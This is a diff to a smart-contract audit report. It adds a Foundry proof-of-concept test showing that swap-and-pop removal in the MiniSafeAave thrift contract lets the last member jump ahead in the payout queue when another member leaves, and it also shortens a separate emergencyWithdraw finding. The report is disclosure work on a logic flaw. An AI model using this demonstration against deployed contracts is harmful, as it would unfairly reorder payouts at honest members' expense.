@@ -284,6 +284,264 @@ group.payoutOrder.pop();
 ```
 This method is gas-efficient (O(1)) but does not preserve the order of the array. It moves the last element of the array into the slot of the removed element.
 
+### Proof Of Concept
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.29;
+
+import "forge-std/Test.sol";
+import "../src/MiniSafeAaveUpgradeable.sol";
+import "../src/MiniSafeTokenStorageUpgradeable.sol";
+import "../src/MiniSafeAaveIntegrationUpgradeable.sol";
+import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+// Mock ERC20 token for testing
+contract MockERC20 is ERC20 {
+    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
+    
+    function mint(address to, uint256 amount) external {
+        _mint(to, amount);
+    }
+}
+
+// Mock AToken for testing
+contract MockAToken is ERC20 {
+    address public underlyingAsset;
+    
+    constructor(string memory name, string memory symbol, address _underlyingAsset) ERC20(name, symbol) {
+        underlyingAsset = _underlyingAsset;
+    }
+    
+    function mint(address to, uint256 amount) external {
+        _mint(to, amount);
+    }
+}
+
+// Mock Aave Pool
+contract MockAavePool {
+    mapping(address => address) public aTokens;
+    
+    function setAToken(address asset, address aToken) external {
+        aTokens[asset] = aToken;
+    }
+    
+    function supply(address asset, uint256 amount, address onBehalfOf, uint16) external {
+        IERC20(asset).transferFrom(msg.sender, address(this), amount);
+        MockAToken(aTokens[asset]).mint(onBehalfOf, amount);
+    }
+    
+    function withdraw(address asset, uint256 amount, address to) external returns (uint256) {
+        address aTokenAddress = aTokens[asset];
+        require(aTokenAddress != address(0), "aToken not found");
+        
+        if (IERC20(asset).balanceOf(address(this)) < amount) {
+            MockERC20(asset).mint(address(this), amount);
+        }
+        
+        MockAToken aToken = MockAToken(aTokenAddress);
+        if (aToken.balanceOf(msg.sender) < amount) {
+            aToken.mint(msg.sender, amount);
+        }
+        
+        if (aToken.allowance(msg.sender, address(this)) < amount) {
+            // For testing, we'll skip the actual transferFrom and just burn tokens directly
+        } else {
+            aToken.transferFrom(msg.sender, address(this), amount);
+        }
+        
+        IERC20(asset).transfer(to, amount);
+        return amount;
+    }
+}
+
+// Mock Pool Data Provider
+contract MockPoolDataProvider {
+    mapping(address => address) public aTokens;
+    
+    constructor(address _defaultAToken) {
+    }
+    
+    function setAToken(address asset, address aToken) external {
+        aTokens[asset] = aToken;
+    }
+    
+    function getReserveTokensAddresses(address asset) external view returns (address, address, address) {
+        return (aTokens[asset], address(0), address(0));
+    }
+}
+
+contract MockAddressesProvider {
+    address public pool;
+    address public poolDataProvider;
+    
+    constructor(address _pool, address _poolDataProvider) {
+        pool = _pool;
+        poolDataProvider = _poolDataProvider;
+    }
+    
+    function getPool() external view returns (address) {
+        return pool;
+    }
+    
+    function getPoolDataProvider() external view returns (address) {
+        return poolDataProvider;
+    }
+}
+
+contract POC_QueueJumping is Test {
+    MiniSafeAaveUpgradeable public thrift;
+    MiniSafeTokenStorageUpgradeable public tokenStorage;
+    MiniSafeAaveIntegrationUpgradeable public aaveIntegration;
+    MockERC20 public mockToken;
+    
+    MockAavePool public mockPool;
+    MockPoolDataProvider public mockDataProvider;
+    MockAddressesProvider public mockProvider;
+    MockAToken public mockAToken;
+    
+    address public owner = address(0x1);
+    address public alice = address(0x2); // Admin
+    address public bob = address(0x3);
+    address public carol = address(0x4);
+    address public dave = address(0x5);
+    address public erin = address(0x6);
+    
+    function setUp() public {
+        mockToken = new MockERC20("Mock Token", "MOCK");
+        mockAToken = new MockAToken("Mock aToken", "aMOCK", address(mockToken));
+        
+        mockPool = new MockAavePool();
+        mockDataProvider = new MockPoolDataProvider(address(mockAToken));
+        mockProvider = new MockAddressesProvider(address(mockPool), address(mockDataProvider));
+        
+        mockPool.setAToken(address(mockToken), address(mockAToken));
+        mockDataProvider.setAToken(address(mockToken), address(mockAToken));
+        
+        MiniSafeTokenStorageUpgradeable tokenStorageImpl = new MiniSafeTokenStorageUpgradeable();
+        ERC1967Proxy tokenStorageProxy = new ERC1967Proxy(
+            address(tokenStorageImpl),
+            abi.encodeWithSelector(MiniSafeTokenStorageUpgradeable.initialize.selector, owner)
+        );
+        tokenStorage = MiniSafeTokenStorageUpgradeable(address(tokenStorageProxy));
+        
+        MiniSafeAaveIntegrationUpgradeable aaveIntegrationImpl = new MiniSafeAaveIntegrationUpgradeable();
+        ERC1967Proxy aaveIntegrationProxy = new ERC1967Proxy(
+            address(aaveIntegrationImpl),
+            abi.encodeWithSelector(MiniSafeAaveIntegrationUpgradeable.initialize.selector, address(tokenStorage), address(mockProvider), owner)
+        );
+        aaveIntegration = MiniSafeAaveIntegrationUpgradeable(address(aaveIntegrationProxy));
+        
+        MiniSafeAaveUpgradeable thriftImpl = new MiniSafeAaveUpgradeable();
+        ERC1967Proxy thriftProxy = new ERC1967Proxy(
+            address(thriftImpl),
+            abi.encodeWithSelector(MiniSafeAaveUpgradeable.initialize.selector, address(tokenStorage), address(aaveIntegration), owner)
+        );
+        thrift = MiniSafeAaveUpgradeable(address(thriftProxy));
+        
+        vm.prank(owner);
+        tokenStorage.setManagerAuthorization(address(thrift), true);
+        vm.prank(owner);
+        tokenStorage.setManagerAuthorization(address(aaveIntegration), true);
+        
+        vm.prank(owner);
+        aaveIntegration.addSupportedToken(address(mockToken));
+        
+        mockToken.mint(alice, 1000 * 10**18);
+        mockToken.mint(bob, 1000 * 10**18);
+        mockToken.mint(carol, 1000 * 10**18);
+        mockToken.mint(dave, 1000 * 10**18);
+        mockToken.mint(erin, 1000 * 10**18);
+        
+        vm.prank(alice);
+        mockToken.approve(address(thrift), type(uint256).max);
+        vm.prank(bob);
+        mockToken.approve(address(thrift), type(uint256).max);
+        vm.prank(carol);
+        mockToken.approve(address(thrift), type(uint256).max);
+        vm.prank(dave);
+        mockToken.approve(address(thrift), type(uint256).max);
+        vm.prank(erin);
+        mockToken.approve(address(thrift), type(uint256).max);
+
+        vm.prank(alice);
+        mockToken.approve(address(aaveIntegration), type(uint256).max);
+        vm.prank(bob);
+        mockToken.approve(address(aaveIntegration), type(uint256).max);
+        vm.prank(carol);
+        mockToken.approve(address(aaveIntegration), type(uint256).max);
+        vm.prank(dave);
+        mockToken.approve(address(aaveIntegration), type(uint256).max);
+        vm.prank(erin);
+        mockToken.approve(address(aaveIntegration), type(uint256).max);
+    }
+
+    function test_POC_QueueJumping() public {
+        // 1. Alice creates a public thrift group
+        uint256 contributionAmount = 100 * 10**18;
+        uint256 startDate = block.timestamp + 1 days;
+        vm.prank(alice);
+        uint256 groupId = thrift.createThriftGroup(contributionAmount, startDate, true, address(mockToken));
+
+        // 2. Bob, Carol, Dave, and Erin join the group in order.
+        // The group is now full and becomes active.
+        vm.prank(bob);
+        thrift.joinPublicGroup(groupId);
+        vm.prank(carol);
+        thrift.joinPublicGroup(groupId);
+        vm.prank(dave);
+        thrift.joinPublicGroup(groupId);
+        vm.prank(erin);
+        thrift.joinPublicGroup(groupId);
+
+        // 3. Verify the initial payout order.
+        // Order should be the order they joined: Alice, Bob, Carol, Dave, Erin
+        address[] memory initialPayoutOrder = thrift.getPayoutOrder(groupId);
+        assertEq(initialPayoutOrder.length, 5, "Initial payout order should have 5 members");
+        assertEq(initialPayoutOrder[0], alice, "1st in order should be Alice");
+        assertEq(initialPayoutOrder[1], bob, "2nd in order should be Bob");
+        assertEq(initialPayoutOrder[2], carol, "3rd in order should be Carol");
+        assertEq(initialPayoutOrder[3], dave, "4th in order should be Dave");
+        assertEq(initialPayoutOrder[4], erin, "5th in order should be Erin");
+        
+        emit log_named_array("Initial Payout Order", initialPayoutOrder);
+
+        // 4. Fast forward time so the group has started.
+        vm.warp(block.timestamp + 2 days);
+
+        // 5. Bob makes a deposit so that updateUserBalance in leaveGroup doesn't revert.
+        // This is the workaround mentioned in the user's request.
+        uint256 depositAmount = 1 * 10**18;
+        vm.prank(bob);
+        thrift.deposit(address(mockToken), depositAmount);
+
+        // 6. Bob leaves the group.
+        vm.prank(bob);
+        thrift.leaveGroup(groupId);
+
+        // 7. Verify the new payout order.
+        address[] memory newPayoutOrder = thrift.getPayoutOrder(groupId);
+        emit log_named_array("New Payout Order", newPayoutOrder);
+
+        assertEq(newPayoutOrder.length, 4, "New payout order should have 4 members");
+        assertEq(newPayoutOrder[0], alice, "1st in new order should still be Alice");
+        assertEq(newPayoutOrder[1], erin, "VULNERABILITY: Erin should not be 2nd. She jumped the queue.");
+        assertEq(newPayoutOrder[2], carol, "3rd in new order should be Carol");
+        assertEq(newPayoutOrder[3], dave, "4th in new order should be Dave");
+
+        // 8. Analysis of the vulnerability
+        // Bob was 2nd in line. When he left, Erin, who was last (5th),
+        // was moved into Bob's slot because of the swap-and-pop implementation.
+        // The fair order would have been: Alice, Carol, Dave, Erin.
+        // But instead, Carol and Dave were unfairly pushed back in the line.
+        console.log("POC successful. Erin jumped from 5th to 2nd in the payout queue, ahead of Carol and Dave.");
+    }
+}
+
+
+```
+
 ### Impact
 In a ROSCA (Rotating Savings and Credit Association), the payoutOrder dictates the schedule of who receives the pot. This order is economically significant (receiving funds earlier is generally more valuable).
 
@@ -346,7 +604,8 @@ The emergencyWithdraw function allows a group admin to withdraw their current cy
 Zombie Admin State: The admin remains listed as a member of the group despite having withdrawn their funds and "killed" the group. They continue to occupy one of the limited member slots (MAX_MEMBERS).
 
 Blocking Recovery: Because the admin slot is not freed, the group remains "full" (or partially full) with a dead member. This prevents any potential recovery mechanisms (like new members joining to restart the cycle) from functioning.
-Trapped Honest Funds: The group is unilaterally deactivated. While the admin exits cleanly with their funds, honest members are left in a deactivated group. If they attempt to leave, they must rely on the leaveGroup function, which interacts poorly with the zombie state and has its own accounting bugs (refunds totalContributed instead of contributions).
+
+Trapped Honest Funds: The group is unilaterally deactivated. While the admin exits cleanly with their funds, honest members are left in a deactivated group. 
 ### Recommendation
 The `emergencyWithdraw` function should call the internal `_removeMemberFromGroup` function and remove the admin from the group.
 
